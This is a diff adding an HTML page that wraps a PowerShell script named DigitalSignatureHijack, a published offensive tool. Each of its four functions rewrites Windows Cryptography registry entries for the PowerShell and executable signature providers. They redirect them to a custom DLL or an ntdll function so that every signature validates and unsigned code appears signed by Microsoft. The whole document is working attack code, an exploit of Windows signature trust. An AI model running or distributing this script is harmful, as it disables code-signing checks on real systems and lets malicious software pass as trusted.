@@ -1,0 +1,87 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>DigitalSignatureHijack_v1.ps1</title>
+</head><body>#https://gist.github.com/netbiosX/fe5b13b4cc59f9a944fe40944920d07c<br/>
+#https://github.com/netbiosX/Digital-Signature-Hijack<br/>
+#https://github.com/mattifestation/PoCSubjectInterfacePackage<br/>
+&lt;#<br/>
+  DigitalSignatureHijack v1.0<br/>
+  License: GPLv3<br/>
+  Author: @netbiosX<br/>
+#&gt;<br/>
+# Validate Digital Signature for PowerShell Scripts<br/>
+<br/>
+function ValidateSignaturePS<br/>
+{<br/>
+	$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'<br/>
+<br/>
+	# PowerShell SIP Guid<br/>
+<br/>
+	$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'<br/>
+<br/>
+	$PSSignatureValidation = Get-Item -Path &quot;$ValidateHashFunc\$PSIPGuid\&quot;<br/>
+<br/>
+	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'<br/>
+	$NewFuncName = 'AutoApproveHash'<br/>
+	<br/>
+	$PSSignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll<br/>
+	$PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName<br/>
+}<br/>
+<br/>
+# Validate Digital Signature for Portable Executables<br/>
+<br/>
+function ValidateSignaturePE<br/>
+{<br/>
+	$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'<br/>
+<br/>
+	# PE SIP Guid<br/>
+<br/>
+	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'<br/>
+<br/>
+$PESignatureValidation = Get-Item -Path &quot;$ValidateHashFunc\$PESIPGuid\&quot;<br/>
+	<br/>
+	$NewDll = 'C:\Windows\System32\ntdll.dll'<br/>
+	$NewFuncName = 'DbgUiContinue'<br/>
+	<br/>
+	$PESignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll<br/>
+	$PESignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName<br/>
+}<br/>
+<br/>
+# Sign PowerShell Scripts with a Microsoft Certificate<br/>
+<br/>
+function SignPS<br/>
+{<br/>
+	$GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg'<br/>
+<br/>
+	# PowerShell SIP Guid<br/>
+<br/>
+	$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'<br/>
+<br/>
+	$PEGetMSCert = Get-Item -Path &quot;$GetCertFunc\$PSIPGuid\&quot;<br/>
+<br/>
+	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'<br/>
+	$NewFuncName = 'GetLegitMSSignature'<br/>
+	<br/>
+	$PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll<br/>
+	$PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName<br/>
+}<br/>
+<br/>
+# Sign Portable Executables with a Microsoft Certificate<br/>
+<br/>
+function SignExe<br/>
+{<br/>
+	$GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg'<br/>
+<br/>
+	# PE SIP Guid<br/>
+<br/>
+	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'<br/>
+<br/>
+	$PEGetMSCert = Get-Item -Path &quot;$GetCertFunc\$PESIPGuid\&quot;<br/>
+<br/>
+	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'<br/>
+	$NewFuncName = 'GetLegitMSSignature'<br/>
+	<br/>
+	$PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll<br/>
+	$PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName<br/>
+}</body></html>
